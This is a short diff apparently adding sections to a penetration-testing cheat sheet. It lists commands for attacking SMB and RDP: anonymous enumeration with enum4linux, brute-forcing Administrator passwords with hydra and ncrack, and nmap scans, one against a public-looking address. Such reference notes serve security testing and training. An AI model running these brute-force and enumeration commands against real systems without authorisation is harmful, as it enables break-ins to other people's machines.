@@ -52,3 +52,21 @@ nmap -Pn -sSVC -p5900 128.32.147.121
 nmap -sSUC -p111 192.168.10.1
  
 ```
+
+### Attacking SMB 
+
+```
+enum4linux -U -S -P -o 192.168.1.15 (Anonymous IPC Access via SMB) 
+hydra -l Administrator -P words.txt 192.168.1.12 smb -t 1
+
+```
+### Attacking RDP Service
+
+```
+RDP brute-force
+
+ncrack -vv --user Administrator –P common.txt 10.0.0.4:3389
+
+nmap -p3389 --script rdp-enum-encryption 10.0.0.4(Transport Security)
+
+```
